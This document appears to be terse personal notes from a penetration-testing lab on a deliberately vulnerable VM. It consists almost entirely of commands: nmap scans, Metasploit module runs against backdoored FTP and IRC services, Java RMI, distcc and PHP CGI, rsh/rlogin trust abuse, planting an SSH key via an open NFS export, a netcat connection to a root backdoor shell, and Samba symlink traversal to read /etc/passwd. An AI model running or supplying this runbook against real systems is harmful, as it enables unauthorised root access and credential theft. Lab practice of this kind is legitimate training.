[Vulnerability Exploitation]
##{Metasploit}##

>>Port scanning<<

nmap -sV -v 198.242.56.121 -p 1-65535 (on testvm2)
nmap -p 0-65535 198.242.56.121
nmap -p 1-65535 -T4 -A -v 198.242.56.121

List of Vulnerabilities:

1)File Transfer Protocol
2)Remote Procedure Calls (RPC) (JAVA RMI Registry)
3)Remote Code Execution (Ruby DRb RMI)
4)Unreal IRC daemon (Backdoor shell)
5)Apache httpd PHP (PHP CGI Injection)
6)UNIX R-Services -- Trust relationships
7)OpenSSH weak keys attack (nfs Service)
8)Backdoor on Port 1524(open backdoor shell)
9)Anonymous login(Samba client)

Metasploit on testvm2(198.242.56.123)
1)File Transfer Protocol
msf	>use exploit/unix/ftp/vsftpd_234_backdoor
	>show options
	>set RHOST 198.242.56.121
	>run

2)Remote Procedure Calls (RPC) (JAVA RMI Registry)
msf	>use exploit/multi/misc/java_rmi_server
	>show options
	>set RHOST 198.242.56.121
	>set LHOST 198.242.56.123
	>run
	
3)Remote Code Execution (Ruby DRb RMI)	
msf	>use exploit/linux/misc/drb_remote_codeexec
	>set URI druby://198.242.56.121:8787
	>set LHOST 198.242.56.123
	>run
	
4)Unreal IRC daemon (Backdoor shell)
msf	>use exploit/unix/irc/unreal_ircd_3281_backdoor
	>set RHOST 198.242.56.121
	>run

msf	>use exploit/unix/misc/distcc_exec
	>set RHOST 198.242.56.121
	>run
	

5)Apache httpd PHP (PHP CGI Injection)
msf	>use exploit/multi/http/php_cgi_arg_injection
	>set RHOST 198.242.56.121
	>set LHOST 198.242.56.123
	>run

6)UNIX R-Services -- Trust relationships
	>rsh 198.242.56.121 id
	>rsh 198.242.56.121 uname -a
	>rlogin -l root 198.242.56.121
	>rpcinfo -p 198.242.56.121
	>showmount -e 198.242.56.121
	
	
7)OpenSSH weak keys attack (nfs Service)
	>rpcinfo -p 198.242.56.121
	>showmount -e 198.242.56.121
	>ssh-keygen
	>mkdir /tmp/r00t
	>mount -t nfs 198.242.56.121:/ /tmp/r00t
	>cat ~/.ssh/id_rsa.pub >> /tmp/r00t/root/.ssh/authorized_keys
	>umount /tmp/r00t
	>ssh root@198.242.56.121
	
8)Backdoor on Port 1524(open backdoor shell)
	>nc 198.242.56.121 1524
	
	>telnet 198.242.56.121 21
	>telnet 198.242.56.121 6200

9)Anonymous login(Samba client)

	>smbclient -L //198.242.56.121
	
msf	>use auxiliary/admin/smb/samba_symlink_traversal
	>set RHOST 198.242.56.121
	>set SMBSHARE tmp
	>run
	
	>smbclient //198.242.56.121/tmp
	>cd rootfs
	>cd etc
	>more passwd